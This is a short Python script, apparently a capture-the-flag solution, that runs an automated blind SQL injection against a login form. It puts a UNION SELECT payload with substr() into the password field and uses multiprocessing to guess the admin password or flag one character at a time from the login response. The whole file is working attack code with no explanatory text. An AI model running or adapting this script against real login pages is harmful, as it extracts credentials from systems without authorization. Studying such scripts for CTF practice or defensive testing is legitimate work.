import requests
import string
import multiprocessing

SUBSTR_LEN = 1


def trial(cha):
    data = {
        "username": "admin",
        "password": f"' UNION SELECT username,1,1,1 FROM users WHERE username='admin' AND substr(password, {substr_idx}, {SUBSTR_LEN}) = '{cha}'-- -",
    }

    response = requests.post("https://ch37242180636.ch.eng.run/login.php", data=data)
    if "failed" not in response.text:
        # print(dct["flag"], cha, response.text[:50])
        dct["flag"] += cha
    # print(response.text)


mgr = multiprocessing.Manager()
dct = mgr.dict()
dct["flag"] = ""
dct["flag_old"] = ""

substr_idx = 1

while True:
    procs = []

    for i in string.ascii_letters + string.digits + "{}_":
        procs.append(multiprocessing.Process(target=trial, args=(i,)))

    for p in procs:
        p.start()

    for p in procs:
        p.join()

    print(dct["flag"])
    if dct["flag_old"] == dct["flag"]:
        break
    else:
        dct["flag_old"] = dct["flag"]

    substr_idx += 1
    # break
